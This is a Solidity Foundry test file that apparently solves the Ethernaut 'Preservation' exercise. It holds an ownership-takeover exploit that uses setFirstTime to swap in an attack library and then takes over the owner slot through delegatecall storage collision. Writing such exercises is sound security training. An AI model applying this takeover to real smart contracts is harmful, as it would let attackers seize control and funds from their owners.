// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Preservation/Preservation.sol";
import "../src/Preservation/AttackPreservation.sol";

contract PreservationTest is Test {
    Preservation preservation;
    LibraryContract libraryContract1;
    LibraryContract libraryContract2;
    AttackPreservation attackPreservation;
    address owner;

    function setUp() public {
        owner = address(this); // Address of the test contract
        libraryContract1 = new LibraryContract();
        libraryContract2 = new LibraryContract();

        // Deploy the Preservation contract
        preservation = new Preservation(
            address(libraryContract1),
            address(libraryContract2)
        );
    }

    function testAttack() public {
        // Deploy the AttackPreservation contract
        attackPreservation = new AttackPreservation();

        // Broadcast as the EOA (Anvil address)
        vm.prank(vm.addr(1), vm.addr(1));

        // Perform the attack by setting the timeZone1Library to point to the attack contract
        preservation.setFirstTime(
            uint256(uint160(address(attackPreservation)))
        );

        vm.prank(vm.addr(1), vm.addr(1));
        // Now use the `setFirstTime` function again, which will call the attack contract's `setTime` function via delegatecall
        preservation.setFirstTime(uint256(uint160(address(this)))); // Pass the owner's address as `uint256`

        // Verify that the owner of the Preservation contract has been changed
        assertEq(
            preservation.owner(),
            vm.addr(1),
            "Attack failed, ownership did not transfer"
        );
    }
}
